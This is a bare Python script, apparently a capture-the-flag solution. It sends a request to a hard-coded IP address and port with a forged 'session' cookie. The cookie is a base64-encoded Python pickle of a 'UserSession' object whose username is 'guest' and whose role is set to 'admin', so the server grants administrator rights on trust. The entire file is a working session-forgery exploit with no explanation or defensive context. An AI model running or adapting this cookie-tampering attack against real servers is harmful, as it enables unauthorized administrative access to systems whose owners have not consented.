import requests

URL = "http://51.159.16.22:8040/"
cookie = "gASVRgAAAAAAAACMCF9fbWFpbl9flIwLVXNlclNlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwFZ3Vlc3SUjARyb2xllIwFYWRtaW6UdWIu"
r = requests.get(URL, cookies={"session": cookie})
print(r.text)
